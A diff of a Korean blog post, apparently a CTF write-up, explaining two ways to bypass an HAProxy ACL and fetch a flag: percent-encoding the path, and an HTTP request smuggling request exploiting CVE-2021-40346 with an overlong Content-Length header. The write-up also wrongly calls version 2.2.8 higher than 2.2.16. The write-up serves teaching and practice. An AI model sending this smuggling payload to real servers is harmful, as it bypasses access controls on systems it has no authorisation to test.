@@ -90,15 +90,36 @@ backend websrvs
 
 ![구글신 만세](/assets/img/2024-06-03-smuggling/google.png)
 
-검색 결과를 확인해보니.. ``Encoded URL`` 은 path_beg 가 매칭되지 않는다는 것을 알 수 있다.
+검색 결과를 확인해보니 인코딩된 URL로 요청하면 통과가 가능하다는 글과
+HAProxy 가 ACL(Access Control List) bypass 를 가능하게 한다는 레딧 글이 있다.
 
-또한 HAProxy 가 ACL(Access Control List) bypass 를 가능하게 한다는 레딧 글이 있다.
 
-첫번째 글의 경우 URL 이 인코딩된 URL 의 경우 200 응답이 수신된다고 하지만 ``/flag`` 는 인코딩하여도 그대로이기 때문에 관련이 없다고 볼 수 있다.
+## Percent Encoding 으로 우회하여 해결하는 방법
 
+[첫번째 글](https://discourse.haproxy.org/t/encoded-url-not-matching-path-beg-or-url-dec/6710) 에선 ``%44%43`` 이런 식으로 인코딩이 되어 있는 주소로 접근할 때에 ACL 바이패스가 가능하다는 글이였다.
+
+이 글에서의 haproxy 버전은 ``2.2.8`` 로 dockerfile 에 명시된 ``haproxy:2.2.16`` 버전보다 높기 때문에 문제 페이지의 haproxy 는 취약할 것이라고 생각된다.
+
+이를 통해 [인코딩](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding) 된 URL 로 ``/flag`` 주소를 접근하면 플래그를 획득할 수 있다.
+
+> Percent Encoding 이란?   
+특별한 의미가 있는 8비트 문자를 URL 내에서 인코딩 할 때에 사용하는 방법이다.   
+인코딩은 % 와 대체 문자의 ASCII 값에 대한 16진수 표현으로 구성된다.   
+예를 들어 Hello 의 경우 ACSII 값으로 "72 101 108 108 111" 이고 이를 16진수 Hex로 바꿔서 각 Hex 에 %를 대입한 후 "%48 %65 %6c %6c %6f" 주소창에 입력하면 Hello 가 나오는 것을 볼 수 있다.
+
+```js
+const toEncode = "flag"
+[...toEncode].map(e => e.charCodeAt()).map(e => "%" + e.toString(16)).join("")
+```
+
+위와 같은 자바스크립트 코드로 ``flag`` 를 Percent Encoding 으로 인코딩 후 ``/%66%6c%61%67`` 주소로 접근할 경우 플래그를 얻을 수 있다.
+
+![FLAG](/assets/img/2024-06-03-smuggling/flag.png)
+
+## HTTP Smugggling 으로 해결한 방법
 [두번째 글](https://www.reddit.com/r/sysadmin/comments/pl5hjb/haproxy_vulnerability_allows_acl_bypass/) 의 경우, 이 글이 링크되어 있다.
 
-[HAProxy vulnerability enables HTTP request smuggling attacks | The Daily Swig (portswigger.net)](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks)
+[HAProxy vulnerability enables HTTP request smuggling attacks | The Daily Swig \(portswigger.net\)](https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks)
 
 "Security researchers have disclosed a HTTP request smuggling vulnerability in HAProxy, the popular open source load balancer."
 > 보안 연구원들이 인기 있는 오픈 소스 로드 밸런서인 HAProxy의 HTTP Request Smuggling 취약점을 공개했습니다.
@@ -106,12 +127,16 @@ backend websrvs
 "Researchers at DevOps platform JFrog demonstrated how an integer overflow flaw (CVE-2021-40346) can be abused to perform HTTP request smuggling attacks that bypass any access control lists (ACLs) defined in HAProxy."
 > DevOps 플랫폼 JFrog의 연구원들은 정수 오버플로 결함(CVE-2021-40346) 을 악용하여 HAProxy에 정의된 ACL(액세스 제어 목록) 을 우회하는 HTTP Request Smuggling 공격을 수행할 수 있는 방법을 시연했습니다.
 
-``jfrog..?`` 아까 서버 코드에 ref. jfrog 라고 적혀있는 게 힌트였던 것 같다.
+``JFrog의 연구원들`` 아까 서버 코드에 ref. jfrog 라고 적혀있는 게 힌트였던 것 같다.
 
-```py
-@app.route('/guest', methods=['GET', 'POST'])
-def guest():
-    return 'ref. jfrog'
 ```
+POST /guest HTTP/1.1
+Host: web.h4ckingga.me:10008
+Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
+Content-Length: 23
 
-[CVE-2021-40346-POC](https://github.com/donky16/CVE-2021-40346-POC)
+GET /flag HTTP/1.1
+h:GET /guest HTTP/1.1
+Host: web.h4ckingga.me:10008
+
+```
